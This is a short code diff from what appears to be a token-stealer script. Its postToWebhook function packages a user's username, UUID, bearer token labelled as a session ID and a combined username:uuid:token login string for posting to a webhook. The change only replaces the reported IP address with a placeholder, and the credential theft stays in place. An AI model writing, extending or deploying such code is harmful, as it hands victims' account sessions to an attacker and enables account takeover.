@@ -113,7 +113,7 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
-                {name: "Ip", value: ip, inline: true},
+                {name: "Ip", value: "[Local Address]", inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
             ]
